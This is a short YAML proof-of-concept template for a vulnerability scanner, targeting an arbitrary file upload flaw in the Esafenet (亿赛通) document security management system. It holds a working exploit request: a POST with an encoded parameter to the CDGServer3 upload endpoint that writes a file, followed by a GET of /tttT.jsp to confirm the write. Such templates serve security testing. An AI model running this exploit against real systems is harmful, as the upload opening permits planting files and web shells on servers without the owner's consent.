id: poc-yaml-esoft-digital-document-system-arbitrary-file-upload
info:
  name: 亿赛通电子文档安全管理系统-任意文件上传漏洞
  severity: high
  tags:
  - 文件上传
  finger: 亿赛通电子文档安全管理系统
variables:
  v1: md5(random_str(8))
requests:
- method: POST
  path: /CDGServer3/UploadFileFromClientServiceForClient?AFMALANMJCEOENIBDJMKFHBANGEPKHNOFJBMIFJPFNKFOKHJNMLCOIDDJGNEIPOLOKGAFAFJHDEJPHEPLFJHDGPBNELNFIICGFNGEOEFBKCDDCGJEPIKFHJFAOOHJEPNNCLFHDAFDNCGBAEELJFFHABJPDPIEEMIBOECDMDLEPBJGBGCGLEMBDFAGOGM
  data: test-{{.v1}}
  expression: status_code == 200
- method: GET
  path: /tttT.jsp
  expression: contains(body, v1)
transport: http
